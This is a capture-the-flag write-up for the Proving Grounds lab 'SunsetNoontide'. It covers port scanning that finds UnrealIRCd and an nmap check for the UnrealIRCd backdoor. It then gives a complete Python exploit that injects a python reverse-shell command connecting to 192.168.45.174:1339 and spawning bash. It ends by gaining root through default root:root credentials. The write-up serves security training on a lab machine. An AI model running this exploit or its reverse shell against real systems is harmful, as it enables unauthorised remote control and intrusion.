* * *
 ### LAB: SunsetNoontide
 ### PLatform: Proving grounds
* * *

### ENUMERATION

- Rustscan's scan result

                                                                                                                                                                          
      ❯ rustscan -a 192.168.178.120 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 192.168.178.120:6667
      Open 192.168.178.120:6697
      Open 192.168.178.120:8067
                                                                                                                                                                       
            
      PORT     STATE SERVICE REASON  VERSION
      6667/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
      6697/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
      8067/tcp open  irc     syn-ack UnrealIRCd (Admin email example@example.com)
      
- After reading on Unrealircd, I discovered that the internet relay chat Unrealircd has a remote code execution flaw.I tested with a
nmap script to determine if the service running on the port is vulnerable.
Command
 `nmap -sV --script=irc-unrealircd-backdoor <target>`

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f69fc13f-e01c-4d99-9c01-ad77e261b8fa)

- I wrote an exploit for it

      #! /usr/bin/python3
      import socket
      # Target's ip and port
      target_ip = "192.168.178.120"
      target_port = 6667

      # Change the ip here to your reverse shell ip and port
      payload = b"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.174\",1339));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
      
      sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      sock.connect((target_ip,target_port))
      sock.recv(1024)
      sock.send(b'AB; ' + payload + b'\n')
      sock.close()

- Now we have a stabilized reverse shell

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/396cda46-c21d-4d97-be96-1e459a06c79c)

# Privesc 

- The root account uses default credentials which is root:root.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1e568ba7-c1ff-4f0e-8e26-cdbf969e339c)

  
